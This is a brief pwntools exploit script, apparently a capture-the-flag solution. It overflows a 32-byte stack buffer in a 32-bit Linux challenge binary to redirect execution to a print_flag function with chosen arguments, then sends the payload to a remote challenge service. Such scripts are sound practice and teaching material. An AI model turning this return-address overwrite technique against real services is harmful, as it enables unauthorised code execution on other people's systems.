from pwn import *

context(arch='i386', os='linux')

context.binary = elf = ELF("./task")

rop = ROP(elf)

#p = process()
p = remote("rivit.dev", 10000)
print_flag = elf.symbols['print_flag'] 

p1 = 0xFFFFFAC7  #-1337
p2 = 0xC0FFEE

buffer_size = 32
padding = b'A' * buffer_size 
padding += b'B' * 8

payload = padding + p32(rop.ret.address) + p32(print_flag) + p32(0x0) + p32(p1) + p64(p2)

p.sendline(payload)

p.interactive()
